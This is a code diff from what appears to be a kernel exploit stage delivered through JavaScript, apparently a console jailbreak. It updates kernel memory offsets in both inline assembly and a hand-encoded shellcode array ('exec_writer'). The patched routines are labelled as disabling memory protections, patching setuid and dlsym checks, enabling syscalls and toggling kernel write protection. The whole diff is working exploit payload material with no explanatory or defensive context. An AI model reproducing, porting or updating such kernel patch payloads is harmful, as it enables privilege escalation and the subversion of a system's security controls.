@@ -855,11 +855,11 @@ var stage2_ = function () {
 
 	    //rwx mprotect
 	    mov rsi, 0x8B49909090909090
-	    mov qword ptr [rdi + 0x451A08], rsi
+	    mov qword ptr [rdi + 0x451DB8], rsi
 
 		//setuid
 		mov rsi, 0x74C08500000000B8
-	    mov qword ptr [rdi + 0x10BB20], rsi
+	    mov qword ptr [rdi + 0x10BED0], rsi
 
 	    //syscalls everywhere
 	    mov dword ptr [rdi + 0x490], 0x0
@@ -872,17 +872,17 @@ var stage2_ = function () {
 	    mov byte ptr [rdi + 0xAB57D], 0x37
 
 	    //dlsym
-	    mov word ptr [rdi + 0x1D85AA], 0xE990
-	    mov dword ptr [rdi + 0x419F20], 0xC3C03148
+	    mov word ptr [rdi + 0x1D895A], 0xE990
+	    mov dword ptr [rdi + 0x41A2D0], 0xC3C03148
 	    
 
 	    //syscall 11
-	    mov qword ptr [rdi + 0x111D210], 0x2
-	    mov rsi, 0x31BCAC
+	    mov qword ptr [rdi + 0x111E210], 0x2
+	    mov rsi, 0x31C05C
 	    add rsi, rdi
-	    mov qword ptr [rdi + 0x111D218], rsi
+	    mov qword ptr [rdi + 0x111E218], rsi
 	    mov rsi, 0x0000000100000000
-	    mov qword ptr [rdi + 0x111D238], rsi
+	    mov qword ptr [rdi + 0x111E238], rsi
 
 
 	    //enable wp
@@ -933,11 +933,11 @@ var stage2_ = function () {
 	exec_writer[24] = 0x9090BE48;
 	exec_writer[25] = 0x90909090;
 	exec_writer[26] = 0x89488B49;
-	exec_writer[27] = 0x451A08B7;
+	exec_writer[27] = 0x451DB8B7;
 	exec_writer[28] = 0xB8BE4800;
 	exec_writer[29] = 0x00000000;
 	exec_writer[30] = 0x4874C085;
-	exec_writer[31] = 0xBB20B789;
+	exec_writer[31] = 0xBED0B789;
 	exec_writer[32] = 0x87C70010;
 	exec_writer[33] = 0x00000490;
 	exec_writer[34] = 0x00000000;
@@ -952,21 +952,21 @@ var stage2_ = function () {
 	exec_writer[43] = 0x87C63700;
 	exec_writer[44] = 0x000AB57D;
 	exec_writer[45] = 0x87C76637;
-	exec_writer[46] = 0x001D85AA;
+	exec_writer[46] = 0x001D895A;
 	exec_writer[47] = 0x87C7E990;
-	exec_writer[48] = 0x00419F20;
+	exec_writer[48] = 0x0041A2D0;
 	exec_writer[49] = 0xC3C03148;
 	exec_writer[50] = 0x1087C748;
-	exec_writer[51] = 0x020111D2;
+	exec_writer[51] = 0x020111E2;
 	exec_writer[52] = 0x48000000;
-	exec_writer[53] = 0xBCACC6C7;
+	exec_writer[53] = 0xC05CC6C7;
 	exec_writer[54] = 0x01480031;
 	exec_writer[55] = 0xB78948FE;
-	exec_writer[56] = 0x0111D218;
+	exec_writer[56] = 0x0111E218;
 	exec_writer[57] = 0x0000BE48;
 	exec_writer[58] = 0x00010000;
 	exec_writer[59] = 0x89480000;
-	exec_writer[60] = 0x11D238B7;
+	exec_writer[60] = 0x11E238B7;
 	exec_writer[61] = 0x000D4801;
 	exec_writer[62] = 0x0F000100;
 	exec_writer[63] = 0xB848C022;
